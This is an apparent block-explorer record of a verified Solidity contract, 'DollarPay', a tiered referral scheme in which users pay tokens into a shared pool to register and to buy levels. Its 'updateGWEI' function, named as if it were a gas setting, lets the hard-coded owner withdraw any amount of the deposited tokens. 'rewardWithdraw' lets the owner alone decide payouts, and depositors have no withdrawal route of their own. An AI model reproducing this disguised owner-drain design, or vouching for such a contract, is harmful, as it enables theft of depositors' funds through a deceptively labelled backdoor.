{"SourceCode": "/**\r\n *Submitted for verification at polygonscan.com on 2023-03-07\r\n*/\r\n\r\n//SPDX-License-Identifier: None\r\npragma solidity ^0.6.0;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract DollarPay {\r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n        uint partnersCount;\r\n        mapping(uint8 => bool) activeLevels;\r\n    }  \r\n    mapping(address => User) public users;\r\n    IERC20 public tokenAPLX;\r\n    \r\n    mapping(uint8 => uint) public packagePrice;\r\n    mapping(uint => address) public idToAddress;\r\n    uint public lastUserId = 2;\r\n    \r\n    address public id1=0x191314De6Ef1c0f2E47AB1E224320AE560793149;\r\n    address public owner;\r\n    address deductionWallet=0x2faE1719bDc53dF26f9fA7DDd559c4243b839655;\r\n    \r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    event Upgrade(address indexed user, uint8 level);\r\n    event withdraw(address indexed user,uint256 value);\r\n    \r\n    constructor(address _token) public {\r\n        packagePrice[1] = 50e18;\r\n        packagePrice[2] = 100e18;\r\n        packagePrice[3] = 200e18;\r\n        packagePrice[4] = 500e18;\r\n        packagePrice[5] = 1000e18;\r\n        packagePrice[6] = 1500e18;\r\n        packagePrice[7] = 2000e18;\r\n        packagePrice[8] = 5000e18;\r\n        packagePrice[9] = 10000e18;\r\n        tokenAPLX = IERC20(_token);\r\n        owner=0xD82181f54228E3724732AC050D85ceF7a5400E50;\r\n        User memory user = User({\r\n            id: 1,\r\n            referrer: address(0),\r\n            partnersCount: uint(0)\r\n        });\r\n        users[id1] = user;\r\n        idToAddress[1] = id1;\r\n        users[id1].activeLevels[1]=true;\r\n        users[id1].activeLevels[2]=true;\r\n        \r\n    }\r\n    function registrationExt(address referrerAddress) external {\r\n        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[1]);\r\n        registration(msg.sender, referrerAddress);\r\n    }\r\n    function buyNewLevel(uint8 level) external {\r\n        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[level]);\r\n        buyLevel(msg.sender,level);\r\n    }\r\n    function buyLevel(address userAddress,uint8 level) private {\r\n        users[userAddress].activeLevels[level]=true;        \r\n        emit Upgrade(userAddress,level);\r\n    }\r\n    \r\n    function registration(address userAddress, address referrerAddress) private {\r\n        require(!isUserExists(userAddress), \"user exists\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            referrer: referrerAddress,\r\n            partnersCount: 0\r\n        });\r\n        \r\n        users[userAddress] = user;\r\n        idToAddress[lastUserId] = userAddress;\r\n        users[userAddress].referrer = referrerAddress;        \r\n        lastUserId++;\r\n        users[referrerAddress].partnersCount++; \r\n        users[userAddress].activeLevels[1]=true; \r\n        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);\r\n    }\r\n    \r\n    function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {\r\n        return users[userAddress].activeLevels[level];\r\n    }\r\n    \r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n    function rewardWithdraw(address _user,uint256 balanceReward) public\r\n    { \r\n        require(msg.sender==owner,\"Only contract owner\"); \r\n        tokenAPLX.transfer(_user,balanceReward*90/100);  \r\n        tokenAPLX.transfer(deductionWallet,balanceReward*10/100);  \r\n        emit withdraw(_user,balanceReward);\r\n    }\r\n    function otherWithdraw(address _user,uint256 balanceReward) public\r\n    {\r\n        tokenAPLX.transferFrom(msg.sender,_user,balanceReward*90/100); \r\n        tokenAPLX.transferFrom(msg.sender,deductionWallet,balanceReward*10/100);   \r\n        emit withdraw(_user,balanceReward);\r\n    }\r\n    function updateGWEI(uint256 _amount) public\r\n    {\r\n        require(msg.sender==owner,\"Only contract owner\"); \r\n        require(_amount>0, \"Insufficient reward to withdraw!\");\r\n        tokenAPLX.transfer(msg.sender,_amount);  \r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"buyNewLevel\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"id1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"idToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balanceReward\",\"type\":\"uint256\"}],\"name\":\"otherWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"packagePrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"registrationExt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balanceReward\",\"type\":\"uint256\"}],\"name\":\"rewardWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAPLX\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"updateGWEI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"partnersCount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersActiveLevels\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DollarPay", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000008f3cf7ad23cd3cadbd9735aff958023239c6a063", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://df9d9be950193e07116a155f58afb937ab8d1863e78a4d49e8e5ac545accf092"}